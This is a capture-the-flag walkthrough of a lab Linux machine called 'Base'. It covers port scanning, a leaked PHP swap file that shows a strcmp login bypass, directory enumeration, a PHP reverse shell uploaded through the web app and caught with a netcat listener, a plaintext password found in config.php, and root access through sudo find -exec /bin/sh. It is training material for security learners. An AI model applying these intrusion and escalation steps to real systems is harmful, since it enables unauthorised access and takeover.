>[!tldr] Base is a very easy Linux machine that focuses on exploiting PHP misconfigurations and insecure coding practices. A vulnerable web application with a listable login folder reveals a swap file containing the PHP code for the web-app. A brief analysis of the code reveals a comparison vulnerability in the login function which allows authentication bypass. With authorized access to the web-app, a reverse shell can be uploaded to grant initial access to the host machine. Then, the web application configuration files can be examined to find a plaintext password allowing SSH access to a more privileged user. Finally, privilege escalation can be achieved abusing misconfigured sudo permissions on the find binary.


# Guided Mode
---
1. `Which two TCP ports are open on the remote host?`
	1. Let's use `nmap`
```shell
❯ nmap  10.129.95.184
<SNIP>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
- Flag #1 -> `22,80`

---
2. `What is the relative path on the webserver for the login page?`
	1. I clicked on **Login** tab and at the top the URL has the relative path
- Flag #2 -> `/login/login.php`

---
3. `How many files are present in the '/login' directory?`
	1. To view the amount of files I removed the `login.php` from the relative path
		1. `https://{target}/login/login.php` -> `https://{target}/login/`
		- Now it will list out the contents of the directory
```shell
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	config.php	2022-06-04 16:24 	61 	 
[ ]	login.php	2022-06-15 11:23 	7.4K	 
[ ]	login.php.swp	2022-06-04 17:09 	16K	 
```
- Flag #3 -> `3`

---
4. `What is the file extension of a swap file?`
	1. Swap files have the extension of `.swp` as we can see from the listen view
		1. `login.php.swp`
- Flag #4 -> `.swp`

---
5. `Which PHP function is being used in the backend code to compare the user submitted username and password to the valid username and password?`
	1. When we check download `login.php.swp` with `strings` we can see the code. 
```php
if (strcmp($password, $_POST['password']) == 0) {
    if (strcmp($username, $_POST['username']) == 0) {
```
- As we can see password and username are compared to `0` with the function `strcmp`
- Flag #5 -> `strcmp()`

---
6. `In which directory are the uploaded files stored?`
	1. We can use `gobuster` to enumerate directories
		1. `gobuster dir -u http://{Attacker-ip} -w raft-large-directories.txt --cookies "session=kid4du6131vmsj7qd1n53d27qv"`
- Flag #6 -> `/_uploaded`

---
7. `Which user exists on the remote host with a home directory?`
	1. Since we now have php upload we can use that to get a reverse shell
		1. Attacker: `nc -lvnp 4444`
		2. Upload `php-reverse-shell.php` (make sure it leads back to your `ip:port`)
		3. Next, activate the shell by accessing `/_uploaded/php-reverse-shell.php`
- Flag #7 -> `john`

---
8. `What is the password for the user present on the system?`
	1. After a lot of enumeration the password can be found in cleartext inside the file:
		1. `/var/www/html/login/config.php`
```shell
<?php
$username = "admin";
$password = "thisisagoodpassword";
```
- Flag #8 -> `thisisagoodpassword`

---
9. User Flag
	1. With the found password `thisisagoodpassword` we test if we can switch our user 
		1. `su admin` - No
		2. `su john` - Yes!
	2. Now with `john` privlieges we can check `/home/john/user.txt` for the flag
- User Flag -> `[REDACTED_FLAG]`

---
10. `What is the full path to the command that the user john can run as user root on the remote host?`
	1. We can use `sudo -l` to find the **root** level privileges our user `john` can use.
- Flag #10 -> `/usr/bin/find`

---
11. `What action can the find command use to execute commands?`
	1. Using [gtfo](https://gtfobins.org/gtfobins/find/) we find that the following command can be used for privilege escalation.
		1. `find . -exec /bin/sh \; -quit`
- Flag #11 -> `exec`

---
12. Root Flag
	1. Next we can use, `find . -exec /bin/sh \; -quit` and you can modify the path and the exection
```shell
$ sudo find /root/ -exec ls {} \;
root.txt
/root/.profile
/root/.bash_history
motd.legal-displayed
/root/.cache/motd.legal-displayed
share
nano
search_history
/root/.local/share/nano/search_history
/root/root.txt
private-keys-v1.d
/root/.bashrc

$ sudo find /root/root.txt -exec cat {} \;
[REDACTED_FLAG]
```
- Root Flag -> `[REDACTED_FLAG]`

